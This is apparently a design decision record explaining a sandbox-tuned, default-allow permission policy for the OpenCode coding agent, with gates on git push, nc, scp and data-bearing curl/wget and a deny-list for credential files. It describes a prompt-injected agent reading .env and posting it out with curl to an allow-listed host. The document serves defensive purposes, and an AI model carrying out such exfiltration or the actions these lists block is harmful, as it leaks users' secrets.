# Decision: default-allow OpenCode permissions, tuned for the sandbox

**Status:** accepted

## Context

The `usai-provider` kit ships an `opencode.jsonc` that includes OpenCode's
`permission` policy. The original policy was a hardened, **default-deny/ask**
config: it denied reading credential files (`.env`, `*.pem`, `~/.aws/*`, …),
gated `git`, package managers, and builds behind `ask`, and hard-denied `sudo`,
`ssh`, `nc`, `rm`, `dd`, and dozens more. That policy was written for an
**untrusted-host** threat model — an agent that shares a filesystem and network
with the user's real machine and real secrets.

This kit does not run in that model. It runs **exclusively inside an sbx
sandbox**:

- an ephemeral container with **no access to the host filesystem**;
- a **proxied, allow-listed network** (egress is constrained by sbx, not by the
  agent's shell);
- **injected credentials** — the container never holds real key material; env
  values are placeholders or proxied.

In that setting, most of the original gates re-implement — weakly — protections
the sandbox already provides, at the cost of constant `ask` prompts. That
friction has its own security cost: it trains users to approve prompts
reflexively, which erodes the value of the one prompt that actually matters. The
exception is the `read` credential-file deny-list: it is a hard `deny` that costs
zero prompts and defends a gap the sandbox does *not* cover (see the Decision),
so we keep it.

## Decision

Adopt a **default-allow** permission policy, gating only the class of action the
sandbox boundary does **not** fully contain, while keeping one cheap,
zero-prompt data-exfil control (the `read` credential deny-list).

- Top-level default `"*": "allow"`; `edit`, `webfetch`, `websearch` allow.
- The `read` tool keeps its **hard-`deny` credential-file list** (`.env`,
  `*.pem`, `*.key`, `*.tfvars`, `~/.aws/*`, kubeconfig, `.npmrc`,
  `.git-credentials`, …). This is the one deny we keep, because it costs **zero
  prompts** (deny, not ask — reading credentials is never the agent's job) and it
  is the only thing that breaks a prompt-injected `read .env` →
  `curl -d @.env <allowed-host>` chain, which the proxy allow-list *cannot* stop
  (see "Why keep the read-deny" below). Example files (`.env.example`, …) are
  allowed and ordered **last** so they win.
- `bash` default `"*": "allow"`.
- `bash` gates (`ask`) the outbound **"new destination"** commands that could
  push workspace contents somewhere a prompt-injected agent chose:
  `git push`, `git remote add`, `git remote set-url`, `gh pr create`, `gh api`,
  and `scp`/`sftp`/`rsync`/`nc`/`ncat`/`netcat`/`telnet`.
- `bash` also gates (`ask`) the **data-bearing forms** of `curl`/`wget`
  (`-d`/`--data`/`-F`/`--form`/`-T`/`--upload-file`/`-X POST|PUT`, and wget's
  `--post-data`/`--post-file`/`--body-*`) as **defense-in-depth** — explicitly
  *not* a claim of completeness (see below).
- **No hard `deny` rules in `bash`.** The sandbox, not a bash denylist, is the
  control for command execution; the only `deny` in the whole policy is the
  `read` credential list, which governs the read *tool*, not shell commands.

### The "new outbound destination" gate is a UX affordance, not a firewall

We deliberately do **not** try to enumerate every command that can send bytes
off-box. Egress is already bounded by the **sandbox proxy allow-list** — an
unknown host is simply unreachable, regardless of which binary tries. Playing
whack-a-mole with an `ask` list for every possible network tool would be endless
and would train reflexive approval, buying no real security over the proxy.

So the `ask` edges exist only as a **human-in-the-loop affordance for the
highest-frequency, highest-consequence "push my workspace to a *named* new
destination" actions** — `git push`/`gh` (the ones an agent reaches for
constantly) plus the classic copy/reverse-shell tools (`scp`/`rsync`/`nc`/…).

The following are **intentionally NOT gated** — they ride the *same* proxy
egress boundary, so gating them adds prompts without adding containment:

| Not gated | Why it's already contained |
|-----------|----------------------------|
| `aws s3 cp` / `aws s3 sync` | Destination host must be on the proxy allow-list. |
| `gcloud storage cp`, `gsutil cp` | Same — bounded by the proxy allow-list. |
| `az storage blob upload` | Same. |
| `docker push` / `podman push` | Registry host must be allow-listed; images are workspace-derived, not secret-material. |
| `dig` / `nslookup` | DNS is a possible covert channel, but the proxy/resolver bounds it; a per-command prompt is theater. |

If a deployment needs any of these gated, that is exactly what the re-gating
mixin (below) is for — it can add them without forking this kit.

### Why keep the read-deny (the one exception to "no deny")

The workspace *should* be a clone/worktree the user chose to mount, without real
secrets — but a user may realistically mount a repo that carries a real
`.env`/`*.pem`/`*.tfvars`. If the agent is prompt-injected, `read .env` →
`curl -d @.env https://api.gsa.usai.gov` exfiltrates to a host that is **on the
allow-list and accepts POST bodies**. The proxy allow-list — the only network
control — cannot distinguish that malicious POST from legitimate model traffic.
A hard `deny` on reading credential files cuts that chain at the source for free.

Scope note (honest about what it is): the read-deny governs the **read tool**,
not `bash`. `cat .env` in a shell is *not* blocked. It is therefore
**belt-and-suspenders**, not a complete exfil block — the data-bearing
curl/wget gates and the proxy allow-list are the other layers.

### What is deliberately allowed (and why it's safe here)

- **Destructive/filesystem/privilege ops** (`rm -rf`, `dd`, `chmod`, `sudo`,
  `systemctl`, …): blast radius is one ephemeral container. `rm -rf` in a
  throwaway box is a self-own, not a breach.
- **`cat`/`less` of dotfiles / "secret" files**: allowed in `bash` (the read
  *tool* deny-list does not cover shell commands). Real credentials are injected,
  not on disk; the read-deny is a cheap extra layer, not a promise.
- **Package installs / builds / tests** (`npm`, `uv`, `pytest`, `make`,
  `cargo`, `docker`): the entire point of a coding agent. Supply-chain risk is
  bounded by the sandbox + egress allow-list, not by an `ask` prompt.
- **Benign `curl`/`wget` reads** (`GET`, no data flags): allowed. A glob cannot
  reliably tell a benign `GET` from an exfiltrating `POST` in every case (flag
  order, data smuggled in a GET URL, encodings), so the data-flag gates are
  **defense-in-depth, not an egress firewall** — the **proxy allow-list** is the
  real network control.
- **Secret-surfacing commands** (`env`, `printenv`, `git remote -v`,
  `git config --get`): allowed. In the sandbox these expose injected
  placeholders / proxied values, not real secret material — inspecting them is
  expected, not a leak. (This matches the sandbox's credential-injection design.)

### Relationship to least-privilege (`least-privilege-review`, AC-6)

This pack also ships deny-by-default review skills (`least-privilege-review`,
`secure-code-review`) and the playbook preaches AC-6. That is not a
contradiction: **least-privilege here is enforced by the sbx boundary (no host
FS, proxied egress, injected creds), not by the permission map** — and the
deny-by-default review skills apply to the *code being reviewed*, not to this
sandbox's own shell. The permission map is deliberately permissive *because* a
stronger control (the sandbox) sits underneath it.

### Residual risk (accepted)

A novel outbound command not in the `ask` list runs unprompted. This is bounded
by the sandbox's proxy egress allow-list (an unknown host is not reachable), and
the highest-consequence known outbound actions (`git push`/`gh`) are gated.
Accepted at FIPS-Low for a development sandbox.

## Re-gating for stricter environments

This kit's default is intentionally sandbox-appropriate, not a
one-size-fits-all host-safe policy. Operators who want tighter controls should
**not fork this kit**. Instead, compose a **separate mixin** that contributes
`ask`/`deny` rules via a project-layer `<workspace>/.opencode/opencode.jsonc`.
OpenCode deep-merges that fragment *over* this kit's `OPENCODE_CONFIG`, and
evaluates the **last matching** permission rule (OpenCode's `evaluate` uses
`findLast` over the flattened rule list — see
`packages/opencode/src/permission`), so a re-gating fragment that loads after
this config wins. This is also why the shipped config places every `ask` edge
*after* the broad `"*": "allow"` — under last-matching-rule, order is
load-bearing. (See the companion co-tenancy decision record for the
merge/precedence contract.) This keeps the permissive default and the strict
overlay as independent, composable pieces.

## Consequences

- Far fewer approval prompts for routine, sandbox-contained work; the prompts
  that remain (`git push`/`gh`, new remotes/channels, data-bearing curl/wget)
  are the ones worth a human's attention.
- The policy is honest about what it is: sandbox-tuned, documented as such in the
  README, and not to be lifted into a non-sandboxed context unchanged.
- Encoded in `tests/opencode-permissions.test.mjs`, which models OpenCode's
  **last-matching-rule** semantics (not most-specific-wins) and asserts the
  default-allow posture, the specific `ask` edges (including `gh` and the
  data-bearing curl/wget forms), the retained `read` credential deny-list, and
  that **`bash`** has no hard-deny rules. It includes a regression test proving a
  trailing broad `allow` reopens a gate — the failure mode that a
  most-specific-wins resolver would have hidden.

## Links

- Companion: `0002-opencode-config-co-tenancy.md` (the merge/precedence contract a
  re-gating mixin relies on)
